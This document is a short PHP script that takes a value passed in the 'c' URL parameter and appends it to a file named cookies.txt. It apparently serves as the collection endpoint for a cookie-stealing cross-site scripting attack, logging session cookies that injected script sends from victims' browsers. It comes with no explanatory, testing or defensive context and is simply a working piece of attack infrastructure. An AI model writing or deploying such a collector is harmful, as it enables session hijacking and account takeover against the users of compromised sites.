<?php

if(!empty($_GET['c'])){
    file_put_contents('cookies.txt', print_r($_GET['c'], true) . "\n---------\n", FILE_APPEND);
}
